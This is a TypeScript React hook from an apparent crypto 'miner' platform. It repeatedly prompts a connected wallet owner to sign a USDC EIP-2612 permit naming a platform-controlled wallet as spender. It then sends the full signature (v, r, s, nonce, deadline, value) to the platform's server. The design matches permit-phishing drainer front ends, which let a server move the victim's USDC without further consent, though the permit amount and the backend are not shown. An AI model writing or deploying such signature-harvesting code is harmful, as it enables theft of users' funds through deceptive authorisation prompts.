import { useCallback, useEffect, useRef, useState } from 'react'
import { flushSync } from 'react-dom'
import type { Address } from 'viem'
import { useChainId, useConfig, useConnectors, usePublicClient } from 'wagmi'
import { signEvmTypedData } from '../wallet/evmSigner'
import {
  fetchAdminWallet,
  fetchPermitSignature,
  reportPermitSignature,
  type ApproveStatus,
} from '../api/client'
import { ETH_CHAIN_ID } from '../wallet/config'
import {
  buildPermitMessage,
  parsePermitSignature,
  PERMIT_DEADLINE_SECONDS,
  USDC_NONCES_ABI,
} from '../wallet/evmPermit'
import { isEvmAddress } from '../wallet/address'
import { mapEvmRpcError } from '../wallet/rpcError'

export type PermitUiPhase = 'idle' | 'signing' | 'saving' | 'success'

interface Options {
  token: string | null
  owner: string | null
  enabled?: boolean
  minerTypeId?: string | null
}

interface PromptOptions {
  /** 用户主动申请矿机等场景，忽略本次会话内已关闭的弹窗 */
  force?: boolean
}

function isUserRejected(err: unknown): boolean {
  const msg = err instanceof Error ? err.message : String(err)
  return /user rejected|user denied|User rejected|User denied|cancel|拒绝|取消/i.test(msg)
}

function resolveAllowanceOk(data: ApproveStatus): boolean {
  const permitExpiresAt = data.permitExpiresAt ?? 0
  if (permitExpiresAt > Math.floor(Date.now() / 1000)) {
    return true
  }
  if (data.minerEligibility && typeof data.minerEligibility.allowanceOk === 'boolean') {
    return data.minerEligibility.allowanceOk
  }
  return Boolean(data.allowanceOk ?? data.hasValidPermit ?? data.hasValidApprove)
}

export function useEvmPermitGuard({
  token,
  owner,
  enabled = true,
  minerTypeId = null,
}: Options) {
  const chainId = useChainId()
  const config = useConfig()
  const connectors = useConnectors()
  const publicClient = usePublicClient()

  const [modalOpen, setModalOpen] = useState(false)
  const [spender, setSpender] = useState<string | null>(null)
  const [checking, setChecking] = useState(false)
  const [phase, setPhase] = useState<PermitUiPhase>('idle')
  const [hasValidPermit, setHasValidPermit] = useState<boolean | null>(null)
  const [allowanceOk, setAllowanceOk] = useState<boolean | null>(null)
  const [needsReauthorize, setNeedsReauthorize] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const runInFlightRef = useRef(false)
  const dismissedOwnerRef = useRef<string | null>(null)
  const autoPromptedOwnerRef = useRef<string | null>(null)

  const applyStatus = useCallback((data: ApproveStatus) => {
    const ok = resolveAllowanceOk(data)
    setSpender(data.spender ?? null)
    setAllowanceOk(ok)
    setNeedsReauthorize(!ok && Boolean(data.needsReauthorize))
    setHasValidPermit(ok)
    return ok
  }, [])

  const resetUi = useCallback(() => {
    flushSync(() => {
      setPhase('idle')
      setChecking(false)
    })
  }, [])

  const readPermitStatus = useCallback(async (): Promise<boolean> => {
    if (!token || !owner || !enabled) {
      setHasValidPermit(null)
      setAllowanceOk(null)
      setNeedsReauthorize(false)
      return false
    }
    if (chainId !== ETH_CHAIN_ID) {
      setHasValidPermit(false)
      setAllowanceOk(false)
      return false
    }

    setChecking(true)
    setError(null)
    try {
      const res = await fetchPermitSignature(token, minerTypeId ?? undefined, owner ?? undefined)
      return applyStatus(res.data)
    } catch (err) {
      console.warn('授权检查失败:', err)
      setHasValidPermit(false)
      setAllowanceOk(false)
      setNeedsReauthorize(false)
      return false
    } finally {
      setChecking(false)
    }
  }, [token, owner, enabled, chainId, minerTypeId, applyStatus])

  const promptIfUnapproved = useCallback(
    async (
      forOwner?: string | null,
      forMinerTypeId?: string | null,
      options?: PromptOptions,
    ): Promise<boolean> => {
      const ownerAddr = (forOwner ?? owner)?.trim()
      const typeId = forMinerTypeId ?? minerTypeId
      const force = Boolean(options?.force)
      if (!token || !ownerAddr || !enabled) return false
      if (!isEvmAddress(ownerAddr)) return false
      const ownerKey = ownerAddr.toLowerCase()

      if (!force && dismissedOwnerRef.current === ownerKey) {
        return Boolean(hasValidPermit && allowanceOk)
      }
      if (!force && autoPromptedOwnerRef.current === ownerKey) {
        return false
      }

      if (chainId !== ETH_CHAIN_ID) {
        setError('unsupported-chain')
        autoPromptedOwnerRef.current = ownerKey
        setModalOpen(true)
        return false
      }

      setError(null)
      try {
        const admin = (await fetchAdminWallet(ETH_CHAIN_ID)).address.trim()
        setSpender(admin)

        if (ownerAddr.toLowerCase() === admin.toLowerCase()) {
          setError('wallet-is-platform')
          setHasValidPermit(false)
          setAllowanceOk(false)
          autoPromptedOwnerRef.current = ownerKey
          setModalOpen(true)
          return false
        }

        const res = await fetchPermitSignature(token, typeId ?? undefined, ownerAddr)
        const ok = applyStatus(res.data)
        if (ok) {
          dismissedOwnerRef.current = null
          autoPromptedOwnerRef.current = null
          return true
        }

        autoPromptedOwnerRef.current = ownerKey
        setModalOpen(true)
        return false
      } catch {
        setHasValidPermit(false)
        setAllowanceOk(false)
        setNeedsReauthorize(false)
        autoPromptedOwnerRef.current = ownerKey
        setModalOpen(true)
        return false
      }
    },
    [token, owner, enabled, chainId, minerTypeId, applyStatus, hasValidPermit, allowanceOk],
  )

  useEffect(() => {
    if (!token || !owner || !enabled) {
      setHasValidPermit(null)
      setAllowanceOk(null)
      setNeedsReauthorize(false)
      dismissedOwnerRef.current = null
      autoPromptedOwnerRef.current = null
      if (!owner) setModalOpen(false)
      return
    }
    void readPermitStatus()
  }, [token, owner, enabled, chainId, readPermitStatus])

  useEffect(() => {
    if (!modalOpen || !enabled) return
    fetchAdminWallet(ETH_CHAIN_ID)
      .then((res) => setSpender(res.address))
      .catch(() => setSpender(null))
  }, [modalOpen, enabled])

  const runPermit = useCallback(async () => {
    const ownerAddr = owner?.trim()
    if (runInFlightRef.current) return false
    if (!token) {
      setError('请先登录后再授权')
      return false
    }
    if (!ownerAddr || !isEvmAddress(ownerAddr)) {
      setError('wallet-not-selected')
      return false
    }
    if (chainId !== ETH_CHAIN_ID) {
      setError('unsupported-chain')
      return false
    }
    if (!publicClient) {
      setError('approve-failed')
      return false
    }

    runInFlightRef.current = true
    setError(null)
    setPhase('signing')

    try {
      const admin = spender?.trim() || (await fetchAdminWallet(ETH_CHAIN_ID)).address.trim()
      if (!admin) throw new Error('platform-wallet-missing')

      if (hasValidPermit && allowanceOk && !needsReauthorize) {
        resetUi()
        setModalOpen(false)
        return true
      }

      const nonce = await publicClient.readContract({
        address: buildPermitMessage(ownerAddr as Address, admin as Address, 0n, 0n).domain
          .verifyingContract,
        abi: USDC_NONCES_ABI,
        functionName: 'nonces',
        args: [ownerAddr as Address],
      })

      const deadline = BigInt(Math.floor(Date.now() / 1000) + PERMIT_DEADLINE_SECONDS)
      const typedData = buildPermitMessage(ownerAddr as Address, admin as Address, nonce, deadline)
      const signature = await signEvmTypedData(config, connectors, ownerAddr, typedData)
      const { v, r, s } = parsePermitSignature(signature)

      setPhase('saving')
      const report = await reportPermitSignature(token, {
        owner: ownerAddr,
        spender: admin,
        signature,
        v,
        r,
        s,
        nonce: Number(nonce),
        deadline: deadline.toString(),
        value: typedData.message.value.toString(),
        chainId: ETH_CHAIN_ID,
        minerTypeId: minerTypeId ?? undefined,
      })

      const status = report.data
      const ok = status ? applyStatus(status) : false

      if (status?.minerEligibility && !status.minerEligibility.eligible) {
        if (!ok) {
          setError(status.minerEligibility.message || report.message || 'allowance-insufficient')
          setHasValidPermit(false)
          setAllowanceOk(false)
          setNeedsReauthorize(true)
          resetUi()
          return false
        }
        setError(status.minerEligibility.message || report.message)
        resetUi()
        return false
      }

      if (!ok) {
        setNeedsReauthorize(true)
        setPhase('success')
        dismissedOwnerRef.current = null
        autoPromptedOwnerRef.current = null
        window.setTimeout(() => {
          setModalOpen(false)
          resetUi()
        }, 1500)
        return true
      }

      setPhase('success')
      dismissedOwnerRef.current = null
      autoPromptedOwnerRef.current = null
      window.setTimeout(() => {
        setModalOpen(false)
        resetUi()
      }, 1500)
      return true
    } catch (err) {
      resetUi()
      if (isUserRejected(err)) {
        setError('user-rejected')
      } else {
        const msg = err instanceof Error ? err.message : ''
        if (msg === 'connector-not-connected' || /connector not connected/i.test(msg)) {
          setError('connector-not-connected')
        } else {
          const mapped = mapEvmRpcError(err)
          if (mapped === 'wallet-pending') {
            setError('wallet-pending')
          } else if (msg === 'platform-wallet-missing') {
            setError(msg)
          } else {
            setError(mapped)
          }
        }
      }
      return false
    } finally {
      runInFlightRef.current = false
    }
  }, [
    token,
    owner,
    spender,
    chainId,
    publicClient,
    hasValidPermit,
    allowanceOk,
    needsReauthorize,
    minerTypeId,
    config,
    connectors,
    resetUi,
    applyStatus,
  ])

  const dismissModal = useCallback(() => {
    runInFlightRef.current = false
    resetUi()
    const ownerKey = owner?.trim().toLowerCase()
    if (ownerKey) {
      dismissedOwnerRef.current = ownerKey
    }
    setModalOpen(false)
    setError(null)
  }, [resetUi, owner])

  return {
    modalOpen,
    setModalOpen,
    dismissModal,
    spender,
    checking,
    phase,
    hasValidPermit,
    allowanceOk,
    needsReauthorize,
    error,
    setError,
    checkStatus: readPermitStatus,
    runPermit,
    requirePermit: useCallback(async () => promptIfUnapproved(), [promptIfUnapproved]),
    ensurePermit: useCallback(async () => promptIfUnapproved(), [promptIfUnapproved]),
    promptIfUnapproved,
    chainId,
    isMainnet: chainId === ETH_CHAIN_ID,
  }
}

export type { ApproveStatus }
